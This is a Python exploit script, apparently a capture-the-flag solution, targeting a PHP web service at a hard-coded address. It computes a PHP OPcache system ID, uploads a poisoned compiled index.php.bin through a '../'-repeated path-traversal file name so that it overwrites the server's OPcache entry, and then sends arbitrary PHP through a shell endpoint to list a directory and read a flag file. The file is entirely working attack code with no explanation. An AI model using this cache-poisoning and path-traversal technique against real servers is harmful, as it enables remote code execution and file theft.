#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
import struct
import requests


class Cli(object):

    def __init__(self, url):
        super(Cli, self).__init__()
        self.url = url
        self.s = requests.Session()
        self.dir = ""
        self.sysid = ""

    def pwd(self):
        params = {"action": "pwd"}
        r = self.s.get(self.url, params=params)
        self.dir = r.content

    def reset(self):
        params = {"action": "reset"}
        self.s.get(self.url, params=params)

    def upload(self, name, filepath):
        params = {
            "action": "upload",
            "name": name
        }
        r = self.s.post(
            self.url,
            params=params,
            files={'file': open(filepath, "rb")}
        )

    def init(self):
        params = {"action": "shell"}
        data = {"test": "test"}
        r = self.s.post(self.url, params=params, data=data)
        r = self.s.post(self.url, params=params, data=data)
        params = {"action": "time"}
        r = self.s.get(url, params=params)
        print r.content
        print struct.pack("<Q", int(r.content)).encode("hex")

    def shell(self, cmd=""):
        params = {"action": "shell"}
        data = {
            "v": cmd
        }
        r = self.s.post(self.url, params=params, data=data)
        if len(r.content) > 200:
            with open("dump.bin.bak", "wb") as fh:
                fh.write(r.content)
        else:
            print r.content


def systemid():
    from md5 import md5
    php_version = "7.0.28"
    zend_extension_id = "API320151012,NTS"
    zend_bin_id = "BIN_SIZEOF_CHAR48888"
    return md5(php_version + zend_extension_id + zend_bin_id).hexdigest()

if __name__ == '__main__':
    url = "http://202.120.7.217:9527/"
    c = Cli(url)
    c.dir = "sandbox/fac849dc498b60000e200f3f2a2712b54da39b92/"
    c.sysid = "7badddeddbd076fe8352e80d8ddf3e73"
    stage = 1
    if stage == 1:
        # clear cache
        c.reset()
    elif stage == 2:
        # trigger cache
        c.init()
    elif stage == 3:
        # overwrite cache
        c.upload(
            "../" * 10 + "tmp/cache/%s/var/www/html/%sindex.php.bin" % (c.sysid, c.dir),
            "index.php.bin"
        )
        # test work
        c.shell("var_dump(1);")
        # list dir
        c.shell('foreach (scandir("/var/www/html/flag") as $file) { echo $file; }')
        # download flag
        c.shell('echo file_get_contents("/var/www/html/flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228cad");')
